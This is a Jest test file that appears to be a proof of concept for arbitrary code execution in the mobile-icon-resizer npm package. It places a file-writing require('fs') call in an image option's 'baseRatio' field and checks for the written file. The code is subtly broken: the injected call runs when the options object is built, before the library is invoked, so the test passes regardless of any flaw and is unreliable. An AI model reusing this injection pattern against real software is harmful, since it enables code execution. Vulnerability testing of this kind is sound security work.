test("Arbitrary code execution in mobile-icon-resizer", () => {
  expect.assertions(2);
  const fs = require("fs");
  const resize = require("mobile-icon-resizer");
  const path = "./mobile-icon-resizer";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    android: {
      images: [
        {
          baseRatio: require("fs").writeFileSync("mobile-icon-resizer", ``),
          folder: "drawable-mdpi",
        },
        {
          baseRatio: "4",
          folder: "drawable-xxxhdpi",
        },
        {
          size: "512x512",
          folder: "WEB",
        },
      ],
    },
  };
  try {
    resize(options, function (err) {});
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
